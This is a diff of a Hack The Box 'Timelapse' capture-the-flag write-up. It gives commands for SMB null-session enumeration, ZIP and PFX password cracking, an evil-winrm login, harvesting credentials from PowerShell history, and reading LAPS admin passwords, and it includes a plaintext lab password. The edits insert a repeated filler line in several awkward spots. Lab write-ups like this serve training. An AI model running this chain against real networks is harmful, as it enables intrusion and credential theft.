@@ -1,3 +1,4 @@
+
 # HTB - Timelapse
 
 **IP Address:** `10.10.11.152`  
@@ -48,6 +49,9 @@ The host responds, confirming it is reachable.
 
 ### 1.2 Port Scanning
 
+Scan all TCP ports to identify open services:
+
+
 Identify all open TCP ports:
 
 ```bash
@@ -68,6 +72,9 @@ extractPorts allPorts
 
 ### 1.3 Targeted Scan
 
+Run a deeper scan on the identified ports with version detection and default scripts:
+
+
 Perform deeper enumeration with service and version detection:
 
 ```bash
@@ -80,9 +87,12 @@ Multiple AD-related services are open, confirming the host is a **Domain Control
 
 ---
 
-## 2. SMB Enumeration
+## 2. Service Enumeration
 
 ### 2.1 Identifying Domain & Hostname
+
+Continue the attack chain with the next commands:
+
 
 ```bash
 crackmapexec smb 10.10.11.152
@@ -92,9 +102,14 @@ crackmapexec smb 10.10.11.152
 
 The machine name is **DC01** and the domain is **timelapse.htb**.
 
+
+Continue the attack chain with the next commands:
+
 ---
 
 ### 2.2 Listing SMB Shares (Null Session)
+
+Attempt a null SMB session and list visible shares:
 
 ```bash
 smbclient -L 10.10.11.152 -N
@@ -108,11 +123,16 @@ Check permissions with `smbmap`:
 smbmap -H 10.10.11.152 -u none
 ```
 
+Continue the attack chain with the next commands:
+
+
 ![SMBMap Null Session Permissions](screenshots/smbmap_none.png)
 
 ---
 
 ### 2.3 Accessing the `Shares` Share
+
+Open the **Shares** share anonymously and locate the backup archive:
 
 ```bash
 smbclient //10.10.11.152/Shares -N
@@ -125,15 +145,21 @@ smbclient //10.10.11.152/Shares -N
 
 ---
 
-## 3. Obtaining Foothold
+## 3. Foothold
 
 ### 3.1 Inspecting the Archive
 
 Listing contents of `winrm_backup.zip` reveals a `.pfx` file, but the ZIP is password-protected.
 
+```bash
+unzip -l winrm_backup.zip
+```
+
 ---
 
 ### 3.2 Cracking the ZIP Password
+
+Brute-force the ZIP password with **fcrackzip** and a wordlist:
 
 ```bash
 fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
@@ -146,6 +172,9 @@ Password recovered → extract `.pfx` file.
 ---
 
 ### 3.3 Attempting PFX Extraction
+
+Continue the attack chain with the next commands:
+
 
 ```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
@@ -175,6 +204,9 @@ Password recovered.
 
 ### 3.5 Extracting Certificate and Key
 
+
+Continue the attack chain with the next commands:
+
 ```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes 
 ```
@@ -203,9 +235,7 @@ evil-winrm -i 10.10.11.152 -c certificates.pem -k priv-key.pem -S
 
 ---
 
-## 4. Lateral Movement
-
-### 4.1 Enumerating Users & Groups
+### 3.7 Enumerating Users & Groups
 
 Check privileges of current user and other accounts:
 
@@ -214,6 +244,9 @@ net user
 whoami /priv
 net user legacyy
 ```
+
+Continue the attack chain with the next commands:
+
 
 ![Legacyy User Privileges](screenshots/legacyy_priv.png)
 
@@ -226,14 +259,19 @@ net user TRX
 
 Notable accounts:
 
+
+Continue the attack chain with the next commands:
+
 - **svc_deploy** → Member of `LAPS_Readers`
 - **TRX** → Member of `Domain Admins`
 
 ---
 
-### 4.2 Harvesting Credentials from PowerShell History
+### 3.8 Harvesting Credentials from PowerShell History
 
-``` powershell
+Inspect PSReadLine history for reused credentials:
+
+```powershell
 type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
@@ -246,7 +284,9 @@ Recovered credentials:
 
 ---
 
-### 4.3 Logging in as svc_deploy
+### 3.9 Logging in as svc_deploy
+
+Reconnect with the recovered **svc_deploy** password over WinRM (SSL):
 
 ```bash
 evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
@@ -256,16 +296,22 @@ evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 
 ---
 
-## 5. Privilege Escalation via LAPS
+## 4. Privilege Escalation
 
-### 5.1 Understanding LAPS
+### 4.1 Understanding LAPS
 
 LAPS (Local Administrator Password Solution) allows domain admins to centrally manage local admin passwords.  
 Members of `LAPS_Readers` can retrieve these passwords from AD.
 
+On the analyst side, confirm tooling exists and the target is still in scope:
+
+```bash
+echo "LAPS passwords stored in AD (ms-Mcs-AdmPwd)"
+```
+
 ---
 
-### 5.2 Uploading LAPS Retrieval Script
+### 4.2 Uploading LAPS Retrieval Script
 
 Now we can extract the LAPS passwords using the following GitHub tool:  
 https://github.com/kfosaaen/Get-LAPSPasswords
@@ -290,7 +336,7 @@ Find-AdmPwdExtendedRights -Identity 'Domain Controllers' Get-AdmPwdPassword -Com
 
 ---
 
-### 5.3 Authenticating as Domain Admin
+### 4.3 Authenticating as Domain Admin
 
 Test retrieved password:
 
